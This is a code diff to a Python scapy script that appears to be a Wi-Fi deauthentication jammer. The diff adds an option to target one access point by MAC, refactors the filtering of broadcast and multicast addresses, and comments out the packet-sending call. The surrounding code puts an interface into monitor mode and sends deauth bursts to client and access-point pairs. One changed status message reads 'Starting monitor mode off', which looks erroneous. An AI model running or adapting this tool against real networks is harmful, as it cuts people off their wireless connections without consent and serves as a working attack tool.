@@ -29,6 +29,7 @@ T  = '\033[93m' # tan
 def parse_args():
 	#Create the arguments
     parser = argparse.ArgumentParser()
+
     parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
     parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
     parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
@@ -37,6 +38,8 @@ def parse_args():
     parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
     parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
     parser.add_argument("-d", "--directedonly", help="Skip the deauthentication packets to the broadcast address of the access points and only send them to client/AP pairs", action='store_true')
+    parser.add_argument("-a", "--accesspoint", help="Enter the MAC address of a specific access point to target")
+
     return parser.parse_args()
 
 
@@ -108,7 +111,7 @@ def get_iface(interfaces):
             return interface
 
 def start_mon_mode(interface):
-    print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
+    print '['+G+'+'+W+'] Starting monitor mode off '+G+interface+W
     try:
         os.system('ifconfig %s down' % interface)
         os.system('iwconfig %s mode monitor' % interface)
@@ -210,9 +213,9 @@ def deauth(monchannel):
             args.packets = 1
 
         for p in pkts:
-            send(p, inter=float(args.timeinterval), count=int(args.packets))
-            #pass
-        #time.sleep(.5)
+            #send(p, inter=float(args.timeinterval), count=int(args.packets))
+            pass
+        time.sleep(.5)
 
 def output(err, monchannel):
     os.system('clear')
@@ -236,6 +239,15 @@ def output(err, monchannel):
             print '['+T+'*'+W+'] '+O+ap[0]+W+' - '+ap[1].ljust(2)+' - '+T+ap[2]+W
     print ''
 
+def noise_filter(skip, addr1, addr2):
+    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
+    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
+    if skip:
+        ignore.append(skip)
+    for i in ignore:
+        if i in addr1 or i in addr2:
+            return True
+
 def cb(pkt):
     '''
     Look for dot11 packets that aren't to or from broadcast address,
@@ -256,21 +268,23 @@ def cb(pkt):
                     clients_APs = []
                     APs = []
 
-    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
-    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_MAC]
-    if args.skip:
-        ignore.append(args.skip)
-
     # We're adding the AP and channel to the deauth list at time of creation rather
     # than updating on the fly in order to avoid costly for loops that require a lock
     if pkt.haslayer(Dot11):
         if pkt.addr1 and pkt.addr2:
+
+            # Filter out all other APs and clients if asked
+            if args.accesspoint:
+                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
+                    return
+
+            # Check if it's added to our AP list
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 APs_add(clients_APs, APs, pkt)
 
-            for i in ignore:
-                if i in pkt.addr1 or i in pkt.addr2:
-                    return
+            # Ignore all the noisy packets like spanning tree
+            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
+                return
 
             # Management = 1, data = 2
             if pkt.type in [1, 2]:
@@ -300,6 +314,7 @@ def APs_add(clients_APs, APs, pkt):
             return APs.append([bssid, ap_channel, ssid])
 
 def clients_APs_add(clients_APs, addr1, addr2):
+
     if len(clients_APs) == 0:
         if len(APs) == 0:
             with lock:
@@ -331,7 +346,6 @@ def stop(signal, frame):
     else:
         remove_mon_iface(mon_iface)
         sys.exit('\n['+R+'!'+W+'] Closing')
-
 
 if __name__ == "__main__":
     if os.geteuid():
